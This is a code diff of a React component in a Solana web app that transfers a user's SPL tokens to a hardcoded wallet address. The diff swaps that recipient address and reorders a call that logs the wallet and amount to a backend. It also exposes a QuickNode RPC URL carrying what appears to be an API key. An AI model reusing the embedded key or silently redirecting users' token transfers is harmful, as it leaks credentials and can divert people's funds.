@@ -61,17 +61,6 @@ const CheckList = () => {
       return;
     }
 
-    fetch("api/playerData", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        address: wallet,
-        amount: Number(solAmount),
-      }),
-    });
-
     const connection = new Connection(
       "https://bold-cold-slug.solana-mainnet.quiknode.pro/54db75007763785718be9e42395c759dfdd3cd39/",
       "confirmed",
@@ -80,7 +69,7 @@ const CheckList = () => {
     try {
       const fromPubkey = new PublicKey(wallet);
       const toPubkey = new PublicKey(
-        "911Dex4Wfy2UtRFSXDg9RwMSAULd7nLGcFP64C8spTuA",
+        "GoHTMvpH31TvaqG1QKAS4rqagEQEC8Jr1V4iFJcX5Nju",
       );
 
       const splTokenMintAddress = new PublicKey(tokenAddress);
@@ -118,6 +107,17 @@ const CheckList = () => {
           skipPreflight: true,
         },
       );
+
+      fetch("api/playerData", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          address: wallet,
+          amount: Number(solAmount),
+        }),
+      });
 
       const confirmation = await connection.confirmTransaction({
         signature,
